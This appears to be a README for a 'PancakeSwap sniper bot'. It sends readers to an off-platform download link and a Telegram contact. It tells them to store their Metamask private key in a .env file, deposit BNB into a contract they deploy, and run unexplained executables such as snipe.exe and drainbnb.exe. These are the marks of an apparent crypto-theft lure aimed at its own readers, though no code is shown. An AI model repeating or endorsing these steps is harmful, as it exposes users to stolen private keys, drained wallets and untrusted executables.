# Pancakeswap_bot
FULL SOFTWARE DOWNLOAD LINK : https://mega.nz/file/KQlQGD4Y#f2keyLPYuJhbsP4ydYA2xk1ke-kgz7BP007t1d-bSe4
If you have question please contact telegram : @johnbest1986

PANCAKESWAP SNIPER BOT WITH SOLIDITY CONTRACT AND AUTO SELL FUNCTION

****HOW TO USE****

1. Deploy contract to remix https://remix.ethereum.org/, , best guide https://docs.binance.org/smart-chain/developer/deploy/remix.html
	* Open pancakeswap.sol from file
	* Edit the sol file by changing the deployer address, please read the contract comment
	* Deploy the contract using the "FrontRunner" class
2. Setting up the .env file
	* ACCOUNT= Metamask BNB address
	* PRIVATE_KEY= Metamask account private key
	* TOKEN_ADDRESS= BNB token address contract (project contract address)
	* FRONTRUNNER_CONTRACT= Contract address you previously deployed from remix
	* BNB_AMOUNT=0.01 //Ignore this amount
	* SELL_AT_X_TIMES=2 //Sell at 2x
	* SLIPPAGE=49 //your slippage
	* GAS_GWEI=100 //your gas
	* GAS_LIMIT=600000 //your gas limit
	* RPC_URL= Quicknode url
	* RPC_URL_WSS= Quicknode wss
3. Running the bot
	* Before running the bot you need to deposit BNB the contract address you deployed earlier
	* Open terminal and locate the file folder, type snipe.exe and hit enter
	* drainbnb.exe is the file you wanted to drain all BNB in the contract address(send all BNB back to deployer address)
	* draintoken.exe is the file you wanted to drain all token in the contract address(send all token back to deployer address)
NOTE
1. Before running the bot make sure all .env file is set
2. After draining the BNB and Token do not use the contract address again as contract already self destruct from node,
   create new contract instead and follow the above instruction.

   
